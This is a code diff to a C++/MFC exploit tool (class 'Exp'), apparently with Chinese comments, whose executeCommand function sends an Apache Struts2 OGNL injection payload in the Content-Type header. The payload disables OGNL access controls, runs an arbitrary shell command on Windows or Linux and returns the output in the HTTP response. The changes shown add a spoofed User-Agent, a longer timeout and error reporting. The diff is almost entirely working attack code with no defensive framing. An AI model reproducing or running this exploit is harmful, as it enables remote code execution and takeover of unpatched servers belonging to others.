@@ -21,6 +21,7 @@ CString Exp::executeCommand(CString url,CString command)
 	CString urlPath = ""; //路径
 	CString contextTypeStr = "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
 		+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
 	CString postData = "";
 	CString resultPage;
 
@@ -40,12 +41,12 @@ CString Exp::executeCommand(CString url,CString command)
 	try
 	{
 		CInternetSession httpSession;
-		httpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,15000); //超时时间
+		httpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,120000); //超时时间
 		httpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
 		httpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
 		CHttpConnection* HttpConnection = httpSession.GetHttpConnection(urlHost);
 		CHttpFile* httpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,urlPath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
-		CString header = contextTypeStr;
+		CString header = contextTypeStr + "\n" + userAgent;
 		httpFile->SendRequest(header,header.GetLength(),(LPVOID)((LPCTSTR)postData),postData.GetLength());
 		DWORD statusCode;	//HTTP状态码
 		httpFile->QueryInfoStatusCode(statusCode);
@@ -64,6 +65,7 @@ CString Exp::executeCommand(CString url,CString command)
 	}
 	catch(CInternetException* e)
 	{
+		e->ReportError();
 	}
 	return resultPage;
 }
